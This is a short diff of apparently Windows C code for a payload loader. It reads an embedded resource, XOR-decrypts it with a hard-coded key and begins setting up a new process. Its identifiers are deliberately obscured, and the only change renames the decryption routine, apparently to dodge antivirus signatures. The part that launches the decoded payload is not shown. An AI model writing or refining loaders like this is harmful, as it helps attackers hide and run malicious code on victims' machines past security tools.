@@ -14,7 +14,7 @@ void helloworld(const char* resName, char** data, DWORD* size) {
     *data = (char*)LockResource(hResData);
 }
 
-void ccccdeckumcrpt(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
+void youareawsomeenc(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
     for (DWORD aa = 0; aa < dancodeLen; aa++) {
         dancode[aa] ^= dkdan1e2y6[aa % dank1e2y6Len];
     }
@@ -31,7 +31,7 @@ int main() {
     DWORD codfhuLen;
     helloworld("dhanushcode56", &codfhu, &codfhuLen);
 
-    ccccdeckumcrpt(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
+    youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
 
     STARTUPINFO si = {0};
     PROCESS_INFORMATION procin = {0};
